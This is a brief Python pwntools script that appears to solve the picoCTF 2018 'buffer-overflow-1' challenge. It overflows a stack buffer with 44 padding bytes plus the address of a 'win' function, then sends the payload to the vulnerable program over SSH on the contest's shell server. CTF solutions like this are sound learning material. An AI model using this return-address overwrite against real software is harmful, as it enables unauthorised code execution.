#!/usr/bin/python
from pwn import *
import os

PATH = os.path.dirname(os.path.realpath(__file__))

USER = 'Platy' # Change username accordingly.

vuln = ELF(PATH + '/vuln')

padding = 'A' * 44
payload = p32(vuln.symbols['win'])

exploit = padding + payload

s = ssh(host='2018shell1.picoctf.com', user=USER) # Make sure ssh-keyz challenge is done first

py = s.run('cd /problems/buffer-overflow-1_3_af8f83fb19a7e2c98e28e325e4cacf78; ./vuln')
print py.recv()
py.sendline(exploit)
print py.recv()
s.close()
